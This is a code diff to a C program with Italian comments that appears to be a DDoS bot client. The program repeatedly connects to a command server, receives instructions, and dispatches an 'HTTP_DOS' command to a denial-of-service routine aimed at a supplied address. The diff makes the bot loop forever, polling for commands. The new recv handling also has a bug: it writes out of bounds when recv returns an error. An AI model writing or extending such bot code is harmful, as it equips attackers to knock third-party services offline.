@@ -14,20 +14,23 @@ void hdos_exe(char *address);
 int hostname_to_ip(char * hostname, char *ip);
 int main(){
 	//Dichiarazione variabili
-	int sockfd, server_port=34567;
-	char server_reply[100];
-	char server_ip[15]="127.0.0.1";
+	int sockfd, server_port=8080;
+	char server_reply[100 + 1] = {0};
+	char server_ip[]="127.0.0.1";
 	//Creo il socket
-    sockfd = socket(AF_INET , SOCK_STREAM , 0);
-    create_conn(sockfd, server_ip,server_port);
-    printf("Connessione creata \n");
-	recv(sockfd , server_reply , 100 , 0);
-	printf("Comando ricevuto: %s \n",server_reply);
-	//Gestisco i comandi del server
-	expression_handler( server_reply);
-	
+	while(1) {
+		sockfd = socket(AF_INET , SOCK_STREAM , 0);
+		create_conn(sockfd, server_ip,server_port);
+		printf("Connessione creata \n");
+
+		size_t rc = recv(sockfd , server_reply , 100 , 0);
+		server_reply[rc] = '\0';
+		if (rc <= 0) continue;
+		printf("Comando ricevuto: %s \n",server_reply);
+		//Gestisco i comandi del server
+		expression_handler( server_reply);
+	}
 	return 0;
-	getchar();
 	   // expression_handler(server_reply);
 	
 }
@@ -41,11 +44,12 @@ void create_conn(int sock, char *server_ip, int server_port){
 	//Connect to remote server
 	ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
 	while(ris<0){  // Finchè non avviene la connessione
+		// TODO Implement sleep
 		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));		
 	}
 	}
 //Funzione per gesire
-void expression_handler(char command[100]){
+void expression_handler(char *command){
 	char hdos[8]="HTTP_DOS";
 	char delim[2]=":";
 	char *token;
